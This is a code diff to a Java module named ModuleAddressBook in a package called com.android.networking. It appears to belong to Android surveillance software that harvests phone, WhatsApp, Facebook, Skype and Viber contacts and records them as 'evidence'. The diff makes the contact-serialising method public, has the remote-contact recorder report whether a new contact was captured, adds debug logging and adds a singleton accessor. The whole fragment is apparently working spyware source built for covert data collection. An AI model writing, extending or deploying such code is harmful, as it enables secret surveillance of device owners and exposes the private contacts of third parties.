@@ -23,6 +23,7 @@ import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.Markup;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerSim;
+import com.android.networking.manager.ManagerModule;
 import com.android.networking.module.task.Contact;
 import com.android.networking.module.task.PhoneInfo;
 import com.android.networking.module.task.PickContact;
@@ -38,7 +39,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 
 	public static final int PHONE = 0x08;
 	public static final int WHATSAPP = 0x07;
-	public static final int FACEBOOK = 0x01;
+	public static final int FACEBOOK = 0x03;
 	public static final int SKYPE = 0x02;
 	public static final int VIBER = 0x0b;
 	public static final int LOCAL = 0x80000000;
@@ -167,7 +168,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 	/**
 	 * serialize contacts in the markup
 	 */
-	private void serializeContacts() {
+	public void serializeContacts() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (serializeContacts)");
 		}
@@ -394,7 +395,7 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		EvidenceReference.atomic(EvidenceType.ADDRESSBOOK, null, payload);
 	}
 
-	public static void createEvidenceRemote(int type, com.android.networking.module.chat.Contact c) {
+	public static boolean createEvidenceRemote(int type, com.android.networking.module.chat.Contact c) {
 
 		long id = Long.parseLong(c.id);
 		if (Cfg.DEBUG) {
@@ -404,9 +405,16 @@ public class ModuleAddressBook extends BaseModule implements Observer<Sim> {
 		byte[] packet = preparePacket(type, id, c.number, c.name, c.extra);
 		boolean needToSerialize = serializeIfNew(id, packet);
 		if (needToSerialize) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (createEvidenceRemote) new address");
+			}
 			EvidenceReference.atomic(EvidenceType.ADDRESSBOOK, null, packet);
 		}
+		return needToSerialize;
+	}
 
+	public static ModuleAddressBook getInstance() {
+		return (ModuleAddressBook) ManagerModule.self().getInstancedAgent(ModuleAddressBook.class);
 	}
 
 }
